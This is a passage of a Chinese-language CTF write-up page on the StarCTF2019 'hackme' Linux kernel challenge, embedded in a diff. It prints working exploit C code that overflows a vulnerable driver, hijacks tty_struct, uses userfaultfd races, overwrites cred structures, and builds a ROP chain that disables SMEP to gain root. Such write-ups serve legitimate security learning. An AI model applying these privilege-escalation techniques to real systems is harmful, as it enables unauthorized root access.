+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="2-劫持tty_struct">2. 劫持tty_struct</h4>
+<p>因为打开<code>/dev/ptmx</code>时,会申请<code>0x400</code>大小的空间,此时释放一个0x400的堆块,当打开<code>/dev/ptmx</code>时会申请前面释放的堆块,再配合<code>write_to_kernel</code>、<code>read_from_kernel</code>以及<code>负数溢出</code>即可从<code>tty_struct</code>结构体中读取到内核指针并控制<code>tty_struct</code>中的<code>tty_operations</code>指针,之后再构建ROP Chain即可</p>
+<h4 id="3-利用userfaultfd机制修改cred结构数据">3. 利用userfaultfd机制修改cred结构数据</h4>
+<p>首先<code>fork</code>200个子进程并让每次fork的子进程判断<code>uid==0</code>后执行shell,此过程中会申请一定相应大小的内存存放<code>Cred结构体</code>,而这段内存位于<code>kmalloc</code>申请的堆块的上方大约<code>0x160000</code>偏移左右处</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">200</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+			<span class="n">get_root</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+	<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="cred结构体">Cred结构体</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
+    <span class="n">atomic_t</span>    <span class="n">usage</span><span class="p">;</span>
+<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span class="cp"></span>    <span class="n">atomic_t</span>    <span class="n">subscribers</span><span class="p">;</span>    <span class="cm">/* number of processes subscribed */</span>
+    <span class="kt">void</span>        <span class="o">*</span><span class="n">put_addr</span><span class="p">;</span>
+    <span class="kt">unsigned</span>    <span class="n">magic</span><span class="p">;</span>
+<span class="cp">#define CRED_MAGIC  0x43736564
+</span><span class="cp">#define CRED_MAGIC_DEAD 0x44656144
+</span><span class="cp">#endif
+</span><span class="cp"></span>    <span class="n">kuid_t</span>      <span class="n">uid</span><span class="p">;</span>        <span class="cm">/* real UID of the task */</span>
+    <span class="n">kgid_t</span>      <span class="n">gid</span><span class="p">;</span>        <span class="cm">/* real GID of the task */</span>
+    <span class="n">kuid_t</span>      <span class="n">suid</span><span class="p">;</span>       <span class="cm">/* saved UID of the task */</span>
+    <span class="n">kgid_t</span>      <span class="n">sgid</span><span class="p">;</span>       <span class="cm">/* saved GID of the task */</span>
+    <span class="n">kuid_t</span>      <span class="n">euid</span><span class="p">;</span>       <span class="cm">/* effective UID of the task */</span>
+    <span class="n">kgid_t</span>      <span class="n">egid</span><span class="p">;</span>       <span class="cm">/* effective GID of the task */</span>
+    <span class="n">kuid_t</span>      <span class="n">fsuid</span><span class="p">;</span>      <span class="cm">/* UID for VFS ops */</span>
+    <span class="n">kgid_t</span>      <span class="n">fsgid</span><span class="p">;</span>      <span class="cm">/* GID for VFS ops */</span>
+    <span class="p">......</span>
+<span class="p">};</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>之后通过负溢读取上方0x160000偏移左右处往后的数据,从中搜寻cred结构体,因为镜像启动后,用户权限是<code>1000</code>,所以对应Cred结构体中的<code>uid</code>开始的<code>8*4</code>字节都是<code>1000</code>，搜索到后则置0</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">MAX_DATA_SIZE</span><span class="p">);</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">,</span> <span class="o">-</span><span class="n">MAX_DATA_SIZE</span><span class="p">);</span>
+	<span class="n">uint32_t</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+	<span class="n">uint32_t</span> <span class="n">cred_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Searching Cred&#34;</span><span class="p">);</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">SEARCH_SIZE</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
+			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Find A Cred At Offset: %#x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span> <span class="c1">// Searching One Cred And Modify IT TO R00T (: 
+</span><span class="c1"></span>			<span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+				<span class="n">mem</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+			<span class="n">cred_offset</span> <span class="o">=</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">cred_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Cannot Find Cred&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>既然已经获取并修改了对应的数据,后面要做的就是将修改后的数据重新写回到内核对应的内存位置,因为写入大约0x10000字节数据后,后面则是不可写数据段,继续写会触发内核崩溃,所以在写回之前,利用<code>userfaultfd机制</code>,在写入<code>0x10000</code>字节的同时,监控<code>0x10000</code>后面的地址,如果触碰到缺页,则会暂停数据拷贝,且此时已经将上面<code>0x10000</code>中的数据写回修改了某个子进程的cred结构体,而此子进程则会判断<code>uid==0</code>并执行<code>/bin/sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="kt">char</span> <span class="o">*</span><span class="n">new</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">memcpy</span><span class="p">(</span><span class="n">new</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">SEARCH_SIZE</span><span class="p">);</span>
+	<span class="n">fault_page</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">new</span> <span class="o">+</span> <span class="n">SEARCH_SIZE</span><span class="p">;</span>
+	<span class="n">fault_page_len</span> <span class="o">=</span> <span class="n">MAX_DATA_SIZE</span> <span class="o">-</span> <span class="n">SEARCH_SIZE</span><span class="p">;</span>
+	<span class="n">register_userfault</span><span class="p">(</span><span class="n">fault_page</span><span class="p">,</span> <span class="n">fault_page_len</span><span class="p">);</span> <span class="c1">// 注册缺页,如果访问到非法地址,则会挂起进程,防止内核崩溃
+</span><span class="c1"></span>	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">new</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">,</span> <span class="o">-</span><span class="n">MAX_DATA_SIZE</span><span class="p">);</span> <span class="c1">// 当内核访问到非法地址时,cred中UID已经被修改为0
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4-利用userfaultfd机制和条件竞争修改tty_struct">4. 利用userfaultfd机制和条件竞争修改tty_struct</h4>
+<p>因为后面利用了<code>tty_struct结构</code>来构造<code>ROP Chain</code>,所以首先保存用户态的几个必要的寄存器,<code>add</code>一次然后释放残留一个很大的size,父进程<code>sleep(2)</code>,让fork的子进程先运行,子进程会先注册并监控缺页内存,子进程中的<code>copy_from_user</code>会因为此时传入到内核中的ptr对应的内存未初始化,从而触碰<code>userfaultfd机制</code>并挂起,此时<code>pool数组</code>中存有一个指针,因为驱动中是在<code>copy_from_user</code>执行后才保存指针的,所以残留的0x200000大小的size没有被覆盖掉</p>
+<pre><code>	*BSS_ptr = k_ptr;
+	copy_from_user(k_ptr, User_ptr, Size);
+	BSS_ptr[1] = Size;
+</code></pre><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">save_status</span><span class="p">();</span>
+	<span class="n">uint64_t</span> <span class="n">fault_page</span><span class="p">,</span><span class="n">fault_page_len</span><span class="p">;</span>
+	<span class="n">uint64_t</span> <span class="n">kernel_base</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">,</span> <span class="n">ptm_unix98_ops</span> <span class="o">=</span> <span class="mh">0x625D80</span><span class="p">;</span>
+	<span class="n">size_t</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
+	
+	<span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">SEARCH_SIZE</span><span class="p">);</span>
+	<span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEARCH_SIZE</span><span class="p">);</span>
+	
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">SEARCH_SIZE</span><span class="p">);</span>
+    <span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+       	<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">uint64_t</span> <span class="n">fault_page</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+        <span class="n">uint64_t</span> <span class="n">fault_page_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+        <span class="n">register_userfault</span><span class="p">(</span><span class="n">fault_page</span><span class="p">,</span> <span class="n">fault_page_len</span><span class="p">);</span> <span class="c1">// 注册监视缺页内存,遇到缺页则会挂起
+</span><span class="c1"></span>        <span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x2E0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// 等待子进程触发页错误
+</span></code></pre></td></tr></table>
+</div>
+</div><p>之后则是利用驱动模块中的指针并搜寻内存中tty_struct结构体的所在位置,因为size很大,所以搜寻的范围也很大,找到tty_struct后利用tty_struct中的数据计算出<code>kernel-base</code>和<code>堆地址</code>则是部署一个<code>ROP Chain</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">size_t</span> <span class="n">ptmx_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;---- Begin TO Find PTMX Struct&#34;</span><span class="p">);</span>
+    
+    <span class="n">uint64_t</span> <span class="n">evil_buf</span><span class="p">[</span><span class="mh">0x200</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">uint64_t</span> <span class="n">ptmx_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">SEARCH_SIZE</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mh">0x200</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">evil_buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x200</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">evil_buf</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0000000100005401</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">ptmx_offset</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="o">*</span><span class="mi">8</span><span class="p">;</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Have Found PTMX Struct At Offset: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptmx_offset</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">ptmx_offset</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ptmx_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] Cannot find ptmx struct&#34;</span><span class="p">);</span>
+    <span class="c1">// 通过tty_struct 中的指针 从而获取堆 和 内核的地址
+</span><span class="c1"></span>    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">evil_buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">ptm_unix98_ops</span><span class="p">;</span>
+    <span class="n">heap_base</span>   <span class="o">=</span> <span class="n">evil_buf</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x38</span> <span class="o">-</span> <span class="n">ptmx_offset</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Kernel:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;HEAP:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">heap_base</span><span class="p">);</span>
+    <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0x4D3D0</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+    <span class="n">commit_creds</span>        <span class="o">=</span> <span class="mh">0x4D220</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>ROP Chain</code>布置如下,不多说了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">evil_buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">;</span>  <span class="c1">// 此处指向 fake_tty_operations 指针位置,只要满足调用ioctl指针的时候调用gadget1
+</span><span class="c1"></span>    											<span class="c1">// 而脚本是从 [0x80/8 + i]开始才存放gadget1指针,所以此处指向0x180偏移处		
+</span><span class="c1"></span>    <span class="n">evil_buf</span><span class="p">[</span><span class="mh">0x38</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span>
+   	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">evil_buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">evil_buf</span><span class="p">),</span> <span class="n">ptmx_offset</span><span class="p">);</span>
+   	
+   	<span class="c1">//******* 简单的构造ROP + tty_struct 进行利用,其中修改CR4寄存器,故可以ret2usr
+</span><span class="c1"></span>   	<span class="n">uint64_t</span> <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mh">0x80</span><span class="o">/</span><span class="mi">8</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x5DBEF</span><span class="p">;</span>
+        <span class="c1">// 改tty_operations中ioctl函数指针对应的指针
+</span><span class="c1"></span>        <span class="c1">// gadget 1:  mov rax, qword ptr [rbx + 0x38]; mov rdx, qword ptr [rax + 0xC8]; call rdx;
+</span><span class="c1"></span>	<span class="n">fake_tty_operations</span><span class="p">[</span><span class="mh">0xC8</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x200F66</span><span class="p">;</span> <span class="c1">//gadget 2:  mov  rsp, rax;  pop  r12;  push r12; retn
+</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x01B5A1</span><span class="p">;</span> <span class="c1">//pop rax ; ret
+</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">=</span> <span class="mh">0x6F0</span><span class="p">;</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>  <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x0252B</span><span class="p">;</span> <span class="c1">//mov cr4, rax; push rcx; popfq; pop rbp; ret;
+</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>  <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">get_root</span><span class="p">;</span>
+    <span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">fake_tty_operations</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_tty_operations</span><span class="p">),</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">ptmx_fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="知识点">知识点</h3>
+<pre><code>1. 堆分配: 在Linux Kernel中,kmalloc等堆内存分配,基于`slub`分配器,当释放的时候,将会以单向链表的形式进行维护;
+   先入后出结构,首位8字节指向之前释放的相同大小堆块  
+   修改此8字节为可控地址,则能够实现任意内存分配,且当堆块申请回来,可以利用残留数据获取堆块地址或者内核基址  
+2. 泄漏模块驱动加载地址: 权限足够,可以读取`/proc/kallsyms` 或者 `cat /sys/modules/device_name/section/.text`,从而获取模块驱动加载地址
+</code></pre><h3 id="reference">&ldquo;Reference&rdquo;</h3>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2ODM4NzUyNQ==&amp;mid=2247483991&amp;idx=1&amp;sn=e32e083187f7cc22e27af26df7c9687a&amp;scene=19#wechat_redirect">[linux内核漏洞利用]call_usermodehelper提权路径变量总结</a><br>
+<a href="../attachment/StarCTF2019_Hackme.zip">[附件]</a></p>
+
+    </div>
+</div>
+
+<div class="container">
+    
+    <nav class="flex container suggested">
+        
+        
+        
+        <a rel="next" href="/articles/%E9%80%9A%E8%BF%87dasctfhws%E8%B5%9B%E9%A2%98babycall%E6%9D%A5%E6%8E%A2%E7%A9%B6%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4/" title="Next post (newer)">
+            <span>Next</span>
+            通过DASCTF&amp;HWS赛题babycall来探究绕过KPTI保护
+            </a> 
+        
+    </nav>
+    
+</div>
+</main>
+
+
+        </main>
+        <footer class="footer flex">
+    <section class="container">
+        <nav class="footer-links">
+            
+            <a href="/index.xml">RSS</a>
+            
+        </nav>
+    </section>
+    
+    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
+</footer>
+    </body>
+</html>
